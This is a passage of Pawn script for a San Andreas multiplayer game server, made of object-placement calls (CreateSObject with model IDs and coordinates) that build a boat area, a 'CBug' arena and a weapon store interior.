	CreateSObject(17031, -1220.40002, -2640.10010, 7.90000,   21.48600, 12.91100, 109.18900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1208.40002, -2646.39990, 7.90000,   21.48400, 12.90900, 35.18800,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1156.80005, -2601.89990, 6.50000,   0.00000, 40.00000, 199.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1150.69995, -2596.39990, 24.70000,   21.48400, 12.90900, 205.18800,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1206.00000, -2669.50000, 7.90000,   21.47800, 12.90900, 1.18400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1071.27698, -2897.26172, -0.60048,   0.00000, 0.00000, 32.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1167.99841, -2994.65234, 0.28990,   0.00000, 0.00000, 321.66928,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1631, -1076.64844, -2835.08179, 0.39668,   0.00000, 0.00000, 218.18866,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1239.90002, -2481.60010, -0.20000,   0.00000, 80.00000, 90.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1236.67920, -2481.54517, -0.20000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1236.70044, -2470.34473, 1.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1239.90002, -2470.19995, 1.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1239.90002, -2458.80005, 3.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1236.70483, -2459.62598, 3.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1239.90002, -2485.10010, -0.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3437, -1236.66077, -2485.32642, -0.80000,   0.00000, 79.99700, 89.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1228.09998, -1955.69995, 1.20000,   0.00000, 0.00000, 42.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13641, -1304.50000, -1878.50000, 1.40000,   0.00000, 0.00000, 128.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1336.90002, -1794.59998, 2.40000,   358.04999, 14.00800, 286.47699,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1300.90002, -1786.09998, 2.40000,   358.04999, 14.00800, 286.47400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1280.40002, -1782.80005, 2.40000,   358.04999, 14.00800, 286.47400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1313.50000, -1787.30005, 25.10000,   359.99500, 57.99900, 285.99600,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1355.69995, -1823.59998, 2.40000,   358.29599, 32.01500, 17.05300,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1352.09998, -1873.19995, 2.40000,   358.29199, 32.01400, 17.05100,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1347.59998, -1925.19995, 2.40000,   358.29199, 32.01400, 1.05100,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1362.19995, -1970.90002, 2.40000,   358.29199, 32.01400, 319.04901,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1370.50000, -2002.69995, 2.40000,   358.02899, 12.00500, 30.40000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1337.69995, -2023.00000, 2.40000,   358.02802, 12.00300, 112.39900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1298.50000, -2014.40002, 2.40000,   358.12500, 22.00200, 94.73300,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1258.59998, -2017.90002, 2.40000,   358.12100, 22.00000, 78.73000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1219.90002, -2037.40002, 2.40000,   358.11600, 21.99500, 54.72800,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1198.50000, -2073.69995, 2.40000,   358.11600, 21.99500, 22.72300,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1193.69995, -2118.80005, 2.40000,   358.11600, 21.99500, 358.72000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1352.09998, -1847.09998, 25.10000,   359.99500, 57.99700, 351.99100,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1352.09998, -1952.69995, 25.10000,   359.98901, 57.99700, 343.98499,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1313.00000, -2017.40002, 25.10000,   359.98401, 57.99700, 103.98200,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1232.69995, -2030.19995, 25.10000,   359.97601, 53.99700, 59.97800,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1199.30005, -2102.69995, 25.10000,   359.97299, 53.99200, 17.97400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1308.69995, -1767.19995, 0.00000,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1341.30005, -1782.40002, 0.00000,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1370.90002, -1799.90002, 0.00000,   0.00000, 0.00000, 36.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1372.09998, -1837.30005, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1372.09998, -1873.69995, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1361.69995, -1904.59998, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1374.59998, -1932.19995, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1376.30005, -1962.59998, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1381.50000, -1994.69995, 0.00000,   0.00000, 0.00000, 35.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1374.30005, -2022.90002, 0.00000,   0.00000, 0.00000, 47.99700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1343.19995, -2038.40002, 0.00000,   0.00000, 0.00000, 67.99400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1311.80005, -2033.09998, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1279.09998, -2030.69995, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1251.30005, -2038.69995, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1223.90002, -2059.30005, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1219.80005, -2091.60010, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(791, -1207.50000, -2131.30005, 0.00000,   0.00000, 0.00000, 67.98900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1634, -1274.84802, -1855.40845, 0.36898,   0.00000, 0.00000, 215.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1350.80005, -1896.19995, 10.20000,   359.98901, 57.99700, 351.98499,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3269, -1311.69995, -1959.59998, -0.80000,   0.00000, 0.00000, 164.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1322.09998, -1958.69995, -16.50000,   358.12100, 22.00000, 10.73000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3664, -1197.00305, -2006.93286, 5.93858,   0.00000, 0.00000, 57.04813,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1168.09998, -2221.39990, 2.40000,   270.00000, 180.00301, 84.19900,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1161.95789, -2197.03101, 1.00000,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1156.03186, -2221.53198, 2.40000,   270.00000, 180.00301, 275.80099,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1161.97559, -2190.95288, 5.30000,   26.00000, 0.00000, 0.03600,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1230.59998, -1953.00000, 1.20000,   0.00000, 0.00000, 41.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1233.09998, -1950.40002, 1.20000,   0.00000, 0.00000, 41.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1235.98792, -1947.41602, 1.20000,   0.00000, 0.00000, 41.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1238.90002, -1944.40002, 1.20000,   0.00000, 0.00000, 41.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(13604, -1241.80005, -1941.40002, 1.20000,   0.00000, 0.00000, 41.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3665, -1221.59998, -1891.00000, 1.80000,   0.00000, 0.00000, 34.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(16085, -1136.63904, -2745.24634, 0.08757,   0.00000, 0.00000, 58.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1165.26001, -2693.00757, -0.28094,   0.00000, 0.00000, 5.07146,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1170.19995, -2221.19995, 2.40000,   270.00000, 180.00000, 264.19400,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1169.13904, -2221.32495, 3.40000,   180.00000, 179.99500, 264.18799,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1154.94312, -2221.40723, 3.40000,   180.00000, 180.00000, 95.80100,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1153.93018, -2221.27905, 2.40000,   270.00000, 179.99500, 95.79500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1171.00000, -2239.80005, -15.40000,   179.99500, 90.00000, 264.18799,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1153.08569, -2239.97437, -15.30000,   179.99500, 270.00000, 95.79500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1156.95630, -2202.95532, -15.30000,   179.99500, 269.99500, 275.79001,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(3458, -1167.30005, -2202.69995, -15.40000,   179.99500, 90.00000, 84.18800,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1634, -1292.94263, -1820.48889, -0.20440,   -8.00000, 0.00000, -91.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1263.60352, -1897.82227, -3.71841,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1271.73267, -2539.00220, 1.30000,   358.05499, 14.00800, 18.15179,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(8148, -1273.75500, -2995.69629, 3.75671,   0.00000, 0.00000, 66.53432,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(16085, -1134.42090, -2898.95972, -1.57594,   0.00000, 0.00000, 58.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(16085, -1027.47986, -2904.43457, -1.57594,   0.00000, 0.00000, 58.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(897, -1066.10889, -2945.59058, -1.88035,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1143.20300, -2872.85352, 0.38150,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1121.75879, -2900.26001, 0.38150,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1138.50916, -2924.11719, 0.38150,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1031.40063, -2929.32935, 0.38150,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1229.27502, -2514.42578, 0.76079,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1229.68445, -2507.39453, 0.76079,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1230.12708, -2501.89624, 0.76079,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1230.37170, -2491.54614, 0.76079,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1255.04028, -2475.45581, 2.21217,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1256.65063, -2486.79907, 2.21217,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1258.94678, -2501.10352, 1.89998,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1283.52881, -1940.32678, -0.16352,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -1248.17456, -1900.91931, -0.16352,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(8148, -1120.60205, -3047.10645, 3.75671,   0.00000, 0.00000, 76.40327,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(8148, -971.85626, -3025.71362, 3.75671,   0.00000, 0.00000, 120.33434,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(897, -1174.03772, -2961.24243, -1.88035,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(897, -1095.98743, -3034.98853, -1.88035,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1632, -1071.27698, -2897.26172, -0.60048,   0.00000, 0.00000, 32.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(16085, -973.10779, -2957.30054, 0.08757,   0.00000, 0.00000, 58.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(1225, -981.68793, -2932.43994, 1.41867,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(8620, -1207.18860, -2579.06738, 21.16126,   0.00000, 0.00000, 36.98087,object_show_distance,0,worlds_dmz + dmz_boats);
	// CBug
	CreateSObject(4002,-1107.53198,-903.72559,150.28090,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4002,-1107.53198,-1072.01050,150.28090,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(8391,-1163.93982,-927.39276,143.17250,0.00000,0.00000,-90.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(8391,-1037.36731,-941.05719,143.17250,0.00000,0.00000,180.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(10143,-1000.02582,-998.74030,128.21370,0.00000,0.00000,45.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(8391,-1174.56958,-1035.53381,143.17247,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(8391,-1046.24060,-1047.55286,143.17250,0.00000,0.00000,90.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(10143,-1210.27148,-975.90100,128.21370,0.00000,0.00000,225.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1163.79541,-1038.69678,127.16071,0.00000,0.00000,0.35440,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1044.64478,-1007.69385,127.25867,0.00000,0.00000,180.42850,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1148.53040,-947.68036,121.63660,0.00000,0.00000,49.84816,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1048.21790,-937.36194,127.25867,0.00000,0.00000,180.96080,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(17612,-1105.81616,-987.49664,128.30791,0.00000,-0.06000,92.32391,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3556,-1116.92041,-984.25153,130.87601,0.00000,0.00000,271.01331,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1174.83618,-1034.65491,127.16071,0.00000,0.00000,0.35440,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1035.18701,-946.81183,127.25867,0.00000,0.00000,188.03815,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1012.93243,-1084.67908,127.90775,0.00000,0.00000,188.03815,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3580,-1117.87244,-946.39886,132.71506,0.00000,0.00000,272.54657,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3580,-1090.26233,-1029.87585,132.93048,0.00000,0.00000,92.27036,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3556,-1092.28308,-997.63177,130.88832,0.00000,0.00000,91.38220,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3599,-1118.18420,-1018.14447,131.94182,0.00000,0.00000,92.64323,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3599,-1092.80029,-964.70624,131.84300,0.00000,0.00000,273.75534,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(17031,-1110.46631,-1054.36047,126.02344,0.00000,0.00000,91.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(17031,-1102.43884,-922.10449,125.21033,0.00000,0.00000,274.43518,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3246,-1164.37988,-979.28931,135.61790,0.00000,0.00000,79.45384,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1117.84778,-1049.41846,123.98447,0.00000,0.00000,229.27876,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1116.94617,-931.65106,128.02940,0.00000,0.00000,47.08134,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1108.64307,-1048.90723,122.93826,0.00000,0.00000,229.76266,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(620,-1106.76599,-932.68799,111.28135,0.00000,0.00000,267.38721,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(620,-1104.45752,-1042.95032,112.19748,0.00000,0.00000,267.38721,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1098.49231,-1047.61938,128.02940,0.00000,0.00000,231.45174,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1096.27344,-931.41913,128.02940,0.00000,0.00000,41.58817,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(648,-1106.21362,-926.16052,128.02940,0.00000,0.00000,41.58817,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3246,-1047.07776,-991.63629,135.61790,0.00000,0.00000,263.26251,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1164.37280,-891.72064,125.41608,0.00000,0.00000,0.35440,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(715,-1112.32593,-959.66937,136.54089,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(715,-1096.80420,-1016.90820,136.69104,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1165.30652,-1041.84277,133.65474,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1043.25000,-936.35626,134.61868,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1070.70898,-980.08411,129.81212,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1141.99695,-991.79810,130.12297,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(13435,-1052.42078,-1010.84814,138.18481,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(13435,-1153.66467,-974.45233,136.42960,0.00000,4.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(690,-1043.61890,-959.45923,130.74831,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(690,-1172.55054,-1016.32001,125.59665,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(16599,-1057.02258,-979.40161,140.66199,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(16599,-1164.20581,-961.12146,139.38933,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3279,-1131.85132,-953.72614,131.85805,0.00000,0.00000,278.35986,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3279,-1059.40686,-939.92322,134.38519,0.00000,0.00000,220.55299,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3279,-1076.91077,-1024.02209,130.39413,0.00000,0.00000,106.43111,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3279,-1154.14697,-1033.07898,134.16090,0.00000,0.00000,47.92276,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1137.13733,-1012.40912,130.12297,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(730,-1080.67017,-957.47882,129.81212,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3625,-1147.60217,-1006.15411,132.45486,0.00000,0.00000,108.26540,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(3625,-1074.32214,-1000.38593,133.86360,0.00000,0.00000,265.32471,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(727,-1148.71912,-960.74512,130.25934,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(727,-1128.77954,-982.64148,129.31897,0.00000,0.00000,359.56320,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(727,-1058.82715,-1007.43970,126.67543,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(727,-1061.46179,-1039.20471,130.33614,0.00000,0.00000,0.00000,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(18259,-1172.89343,-929.95764,134.23412,0.00000,0.00000,138.64563,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1035.06348,-1021.59558,127.25867,0.00000,0.00000,188.03815,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(18259,-1035.11011,-1044.69751,134.61943,0.00000,0.00000,318.80902,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1201.91565,-926.10492,127.25867,0.00000,0.00000,0.15340,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1176.25989,-956.49469,127.25867,0.00000,0.00000,0.15340,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1047.61523,-1088.96899,127.15965,0.00000,0.00000,188.03815,object_show_distance,0,worlds_dmz + dmz_cbug);
	CreateSObject(4876,-1155.38525,-954.71869,124.14443,0.00000,0.00000,49.84816,object_show_distance,0,worlds_dmz + dmz_cbug);
	// Weapon Store
	CreateSObject(19461, -2855.78467, 2229.23071, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2839.32422, 2236.55835, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2839.33472, 2227.02466, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2844.11548, 2226.92261, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2852.57104, 2229.23706, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2864.62939, 2225.35840, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19397, -2853.80762, 2245.91260, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2839.34302, 2240.82495, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2844.18213, 2245.88696, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2839.34546, 2241.15381, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2868.38989, 2245.92090, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2858.90967, 2245.92798, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19415, -2849.97949, 2245.90308, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19378, -2844.67334, 2240.97461, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2844.68018, 2231.33398, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2855.14185, 2240.96216, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2855.12964, 2231.34375, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2865.62866, 2240.96680, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2865.62305, 2231.33984, 3.76000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -2865.64355, 2226.03394, 3.75900,   0.00000, 90.00000, 0.00000);
	CreateSObject(1586, -2878.07031, 2234.13794, 4.96160,   0.00000, 0.00000, 90.00000);
	CreateSObject(2941, -2842.50000, 2240.56104, 4.83140,   0.00000, 0.00000, 270.00000);
	CreateSObject(2004, -2839.52930, 2245.11060, 4.90000,   0.00000, 0.00000, 270.00000);
	CreateSObject(1616, -2839.79126, 2232.10864, 6.61220,   0.00000, 0.00000, 9.00000);
	CreateSObject(2612, -2847.79907, 2245.71655, 5.69700,   0.00000, 0.00000, 0.00000);
	CreateSObject(1585, -2848.52588, 2245.94482, 4.95262,   0.00000, 0.00000, 0.00000);
	CreateSObject(18092, -2842.27173, 2241.76367, 4.21150,   0.00000, 0.00000, 90.00000);
	CreateSObject(2332, -2842.35767, 2242.93115, 4.07710,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2864.62671, 2241.00806, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2845.80859, 2227.08887, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19397, -2844.18726, 2231.80933, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2850.62720, 2229.23828, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(18044, -2843.62476, 2242.72778, 5.55950,   0.00000, 0.00000, 180.00000);
	CreateSObject(2459, -2858.40649, 2235.08984, 3.73698,   0.00000, 0.00000, 0.00000);
	CreateSObject(2467, -2852.22119, 2235.13501, 3.51290,   0.00000, 0.00000, 0.00000);
	CreateSObject(2492, -2839.57764, 2239.06372, 5.60330,   0.00000, 0.00000, 270.00000);
	CreateSObject(2463, -2850.06396, 2229.41162, 4.52883,   0.00000, 0.00000, 180.00000);
	CreateSObject(2463, -2851.56567, 2229.40527, 4.52880,   0.00000, 0.00000, 180.00000);
	CreateSObject(2190, -2842.23999, 2243.79443, 4.70680,   0.00000, 0.00000, 0.00000);
	CreateSObject(2002, -2839.79810, 2233.18726, 3.85790,   0.00000, 0.00000, 270.00000);
	CreateSObject(1817, -2841.12451, 2234.69653, 3.84270,   0.00000, 0.00000, 90.00000);
	CreateSObject(1744, -2842.76904, 2245.90698, 4.49850,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2841.30786, 2245.90918, 4.49800,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2839.47534, 2243.27588, 4.47850,   0.00000, 0.00000, 270.00000);
	CreateSObject(1744, -2839.46973, 2241.81616, 4.47800,   0.00000, 0.00000, 270.00000);
	CreateSObject(1723, -2840.86670, 2232.40015, 3.79680,   0.00000, 0.00000, 180.00000);
	CreateSObject(1724, -2842.38818, 2237.43066, 3.84280,   0.00000, 0.00000, 0.00000);
